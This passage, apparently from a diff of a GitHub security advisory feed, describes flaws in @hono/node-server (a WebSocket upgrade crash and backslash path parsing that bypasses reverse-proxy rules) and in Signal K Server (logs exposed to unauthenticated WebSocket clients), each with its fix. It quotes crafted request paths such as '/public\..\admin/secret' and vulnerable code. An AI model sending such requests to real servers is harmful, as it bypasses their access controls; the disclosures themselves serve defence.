-<td><code>2.1.6</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>While <code>@hono/node-server</code> waits for the Hono application to handle a WebSocket upgrade request, the socket has no error listener. If the client resets the TCP connection during that time, the resulting <code>ECONNRESET</code> is emitted as an unhandled <code>'error'</code> event and the process terminates.</p>
-<h3 id="details">Details</h3>
-<p>The upgrade handler awaits the application before attaching any listener to the socket. When middleware on the upgrade path does asynchronous work, such as an authentication lookup, a connection reset in that window has no handler. If a global <code>uncaughtException</code> handler swallows the error, the pending upgrade is never released and its entry is retained for the lifetime of the process.</p>
-<p>The fix attaches error and close listeners to the socket before calling the application, releases the pending upgrade when the socket closes, and skips the handshake on a destroyed socket.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated client can terminate the server process with a single connection by sending a WebSocket upgrade request and resetting the connection before the application has responded. Where the crash is suppressed, repeated requests grow the heap.</p>
-<p>This affects applications that enable WebSocket support in <code>@hono/node-server</code> and run asynchronous middleware or handlers on the upgrade path.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/node-server/security/advisories/GHSA-qv5m-9pm6-hqp3">https://github.com/honojs/node-server/security/advisories/GHSA-qv5m-9pm6-hqp3</a></li>
-<li><a href="https://github.com/honojs/node-server/commit/61cc0267e613e684401f17c27538ba3bf97339a4">https://github.com/honojs/node-server/commit/61cc0267e613e684401f17c27538ba3bf97339a4</a></li>
-<li><a href="https://github.com/honojs/node-server/releases/tag/v2.1.6">https://github.com/honojs/node-server/releases/tag/v2.1.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-qv5m-9pm6-hqp3">https://github.com/advisories/GHSA-qv5m-9pm6-hqp3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qv5m-9pm6-hqp3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T21:32:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hono/node-server] @hono/node-server: Backslash in the request path is parsed as a path separator, bypassing path-based access control at a reverse proxy]]></title>
-        <id>https://github.com/advisories/GHSA-jpvv-r467-5p4w</id>
-        <link href="https://github.com/advisories/GHSA-jpvv-r467-5p4w"/>
-        <updated>2026-11-12T21:28:03.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@hono/node-server</td>
-<td><code>&lt; 1.19.18</code></td>
-<td><code>1.19.18</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p><code>@hono/node-server</code> passes the raw request-target to the WHATWG URL parser, which treats a backslash in the path as <code>/</code> and then resolves <code>..</code> segments. A request for <code>/admin\secret</code> or <code>/public\..\admin/secret</code> reaches the application as <code>/admin/secret</code>. A reverse proxy that follows RFC 3986 forwards the backslash unchanged and applies its path-based rules to the original path, so the request reaches a route the proxy is meant to block.</p>
-<h3 id="details">Details</h3>
-<p>A raw backslash is not allowed in a request-target (RFC 3986, RFC 9112 Section 3.2.1), and RFC 9112 Section 3.2 says a recipient should reject such a request rather than correct it. Proxies such as nginx on Linux, HAProxy and Envoy keep the backslash as an ordinary character, so they and the application see different paths.</p>
-<p>The fix responds with <code>400 Bad Request</code> to a request whose path contains a raw backslash, for HTTP/1.1, HTTP/2, absolute-form request-targets and WebSocket upgrades. A percent-encoded backslash and a backslash in the query string are still accepted.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated client can reach a route that a reverse proxy, load balancer or WAF in front of the application blocks by path.</p>
-<p>This affects applications served by <code>@hono/node-server</code> behind a front component that makes path-based decisions and forwards a backslash unchanged. Access control inside the Hono application, such as middleware on <code>/admin/*</code>, runs on the rewritten path and is not affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w">https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w</a></li>
-<li><a href="https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313">https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313</a></li>
-<li><a href="https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c">https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c</a></li>
-<li><a href="https://github.com/honojs/node-server/releases/tag/v1.19.18">https://github.com/honojs/node-server/releases/tag/v1.19.18</a></li>
-<li><a href="https://github.com/honojs/node-server/releases/tag/v2.1.6">https://github.com/honojs/node-server/releases/tag/v2.1.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-jpvv-r467-5p4w">https://github.com/advisories/GHSA-jpvv-r467-5p4w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jpvv-r467-5p4w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T21:28:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hono/node-server] @hono/node-server: Backslash in the request path is parsed as a path separator, bypassing path-based access control at a reverse proxy]]></title>
-        <id>https://github.com/advisories/GHSA-jpvv-r467-5p4w</id>
-        <link href="https://github.com/advisories/GHSA-jpvv-r467-5p4w"/>
-        <updated>2026-11-12T21:28:03.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@hono/node-server</td>
-<td><code>&gt;= 2.0.0, &lt; 2.1.6</code></td>
-<td><code>2.1.6</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p><code>@hono/node-server</code> passes the raw request-target to the WHATWG URL parser, which treats a backslash in the path as <code>/</code> and then resolves <code>..</code> segments. A request for <code>/admin\secret</code> or <code>/public\..\admin/secret</code> reaches the application as <code>/admin/secret</code>. A reverse proxy that follows RFC 3986 forwards the backslash unchanged and applies its path-based rules to the original path, so the request reaches a route the proxy is meant to block.</p>
-<h3 id="details">Details</h3>
-<p>A raw backslash is not allowed in a request-target (RFC 3986, RFC 9112 Section 3.2.1), and RFC 9112 Section 3.2 says a recipient should reject such a request rather than correct it. Proxies such as nginx on Linux, HAProxy and Envoy keep the backslash as an ordinary character, so they and the application see different paths.</p>
-<p>The fix responds with <code>400 Bad Request</code> to a request whose path contains a raw backslash, for HTTP/1.1, HTTP/2, absolute-form request-targets and WebSocket upgrades. A percent-encoded backslash and a backslash in the query string are still accepted.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated client can reach a route that a reverse proxy, load balancer or WAF in front of the application blocks by path.</p>
-<p>This affects applications served by <code>@hono/node-server</code> behind a front component that makes path-based decisions and forwards a backslash unchanged. Access control inside the Hono application, such as middleware on <code>/admin/*</code>, runs on the rewritten path and is not affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w">https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w</a></li>
-<li><a href="https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313">https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313</a></li>
-<li><a href="https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c">https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c</a></li>
-<li><a href="https://github.com/honojs/node-server/releases/tag/v1.19.18">https://github.com/honojs/node-server/releases/tag/v1.19.18</a></li>
-<li><a href="https://github.com/honojs/node-server/releases/tag/v2.1.6">https://github.com/honojs/node-server/releases/tag/v2.1.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-jpvv-r467-5p4w">https://github.com/advisories/GHSA-jpvv-r467-5p4w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jpvv-r467-5p4w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T21:28:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[signalk-server] Signal K Server: Buffered logs exposed to unauthenticated WebSocket clients]]></title>
-        <id>https://github.com/advisories/GHSA-7m8x-x364-m26j</id>
-        <link href="https://github.com/advisories/GHSA-7m8x-x364-m26j"/>
-        <updated>2026-11-12T19:14:01.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>signalk-server</td>
-<td><code>&lt; 2.31.0-beta.1</code></td>
-<td><code>2.31.0-beta.1</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>An unauthenticated WebSocket client can subscribe to the log path and receive buffered server logs.</p>
-<p>WebSocket connections are intentionally permitted before authentication because login occurs over the WebSocket connection. However, the log subscription path does not enforce an authorization check.</p>
-<p><code>processSubscribe</code> handles subscriptions to the log path separately, without applying access control:</p>
-<pre><code class="language-ts">if (
-  Array.isArray(msg.subscribe) &amp;&amp;
-  msg.subscribe.length &gt; 0 &amp;&amp;
-  msg.subscribe[0].path === 'log'
-) {
-  if (!spark.logUnsubscribe) {
-    spark.logUnsubscribe = startServerLog(app, spark)
-  }
-} else {
-  // normal subscriptions go through subscriptionmanager, which applies
-  // securityStrategy.filterReadDelta
-}
-</code></pre>
-<p><code>startServerLog</code> then replays the whole buffer to that socket:</p>
-<pre><code class="language-ts">app.logging.getLog().forEach((log) =&gt; {
-  spark.write({ type: 'LOG', data: log })
-})
-</code></pre>
-<p>The asymmetry is inside this one file. Writes are gated by <code>securityStrategy.shouldAllowWrite</code> (<code>ws.ts:961</code>), normal delta subscriptions are filtered by <code>securityStrategy.filterReadDelta</code> (<code>ws.ts:1159</code>, the else branch of this same function), and the log branch consults neither.</p>
-<p>An unauthenticated socket, which is legitimately open for login, can subscribe to <code>log</code> and receive buffered server logs.</p>
-<p>Fix: Requires an administrator principal, before <code>startServerLog</code>, in the same way the other branch defers to <code>securityStrategy</code>. The fix was released with version 2.31.0-beta.1.</p>
-<p>The investigated code path was reviewed at commit 26ab199. No server was run and no WebSocket frames were captured. AI assistance was used during the investigation.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/SignalK/signalk-server/security/advisories/GHSA-7m8x-x364-m26j">https://github.com/SignalK/signalk-server/security/advisories/GHSA-7m8x-x364-m26j</a></li>
-<li><a href="https://github.com/SignalK/signalk-server/commit/1bee85114a4cb7403aba71632d9902792d6b4f0c">https://github.com/SignalK/signalk-server/commit/1bee85114a4cb7403aba71632d9902792d6b4f0c</a></li>
-<li><a href="https://github.com/SignalK/signalk-server/releases/tag/v2.31.0">https://github.com/SignalK/signalk-server/releases/tag/v2.31.0</a></li>
-<li><a href="https://github.com/SignalK/signalk-server/releases/tag/v2.31.0-beta.1">https://github.com/SignalK/signalk-server/releases/tag/v2.31.0-beta.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-7m8x-x364-m26j">https://github.com/advisories/GHSA-7m8x-x364-m26j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7m8x-x364-m26j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T19:14:00.000Z</published>
     </entry>
 </feed>
